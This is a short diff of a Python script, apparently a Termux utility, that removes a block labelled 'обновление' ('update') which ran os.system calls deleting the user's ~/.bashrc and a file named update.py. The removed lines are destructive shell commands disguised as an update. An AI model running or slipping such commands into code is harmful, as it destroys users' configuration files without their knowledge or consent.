@@ -1,10 +1,5 @@
 import os, time
 
-#обновление
-
-os.system('rm ~/.bashrc')
-os.system('rm -fr /data/data/com.termux/files/home/update.py')
-
 #colorama
 
 os.system('clear')
